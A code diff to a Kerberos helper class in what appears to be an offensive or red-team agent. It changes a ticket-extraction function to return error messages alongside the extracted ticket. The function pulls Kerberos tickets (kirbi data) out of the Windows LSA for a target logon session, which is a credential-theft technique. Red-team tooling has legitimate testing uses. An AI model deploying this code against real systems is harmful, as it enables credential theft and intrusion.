@@ -443,14 +443,14 @@ internal class KerberosHelpers
 
 
     //extract ticket
-    internal static KerberosTicket? ExtractTicket(LUID targetLuid, string targetName)
+    internal static (KerberosTicket?, string) ExtractTicket(LUID targetLuid, string targetName)
     {
         try
         {
             targetName = targetName.Trim();
             //needs to be elevated to pass in a logon id so if we aren't we wipe the value here
             //Discarding the logonSessions because we do not need them so we pass false to prevent enumerating them
-            (HANDLE lsaHandle, uint authPackage, IEnumerable<LUID> _) =  InitKerberosConnectionAndSessionInfo(false);
+            (HANDLE lsaHandle, uint authPackage, IEnumerable<LUID> _) =  InitKerberosConnectionAndSessionInfo();
             //if we are not an admin user then we cannot send a real lUID so we need to send a null one
             if(Agent.GetIdentityManager().GetIntegrityLevel() is <= IntegrityLevel.MediumIntegrity)
             {
@@ -462,7 +462,7 @@ internal class KerberosHelpers
             if(ticket is null)
             {
                 DebugHelp.DebugWriteLine($"Failed to find ticket for {targetName}");
-                return null;
+                return (null, $"Failed to find ticket for {targetName}");
             }
 
             KERB_RETRIEVE_TKT_REQUEST request = new()
@@ -497,7 +497,7 @@ internal class KerberosHelpers
             if (status != NTSTATUS.STATUS_SUCCESS || returnStatus != NTSTATUS.STATUS_SUCCESS)
             {
                 DebugHelp.DebugWriteLine($"Failed to extract ticket with error: {status} and return status: {returnStatus}");
-                return null;
+                return (null, $"Failed to extract ticket with error: {status} and return status: {returnStatus}");
             }
             //convert the location of the ticket in memory to a struct
             var response = returnBuffer.CastTo<KERB_RETRIEVE_TKT_RESPONSE>();
@@ -507,17 +507,17 @@ internal class KerberosHelpers
             {
                 DebugHelp.DebugWriteLine("No ticket Data to extract");
                 WindowsAPI.LsaFreeReturnBufferDelegate(returnBuffer);
-                return null;
+                return (null, "No ticket Data to extract");
             }
             //copy the ticket data to a byte array
             ticket.Kirbi = new byte[response.Ticket.EncodedTicketSize];
             Marshal.Copy(response.Ticket.EncodedTicket, ticket.Kirbi, 0, (int)response.Ticket.EncodedTicketSize);
             WindowsAPI.LsaFreeReturnBufferDelegate(returnBuffer);
-            return ticket;
+            return (ticket, "");
         }
         catch (Exception e)
         {
-            return null;
+            return (null, e.Message);
         }
     }
 
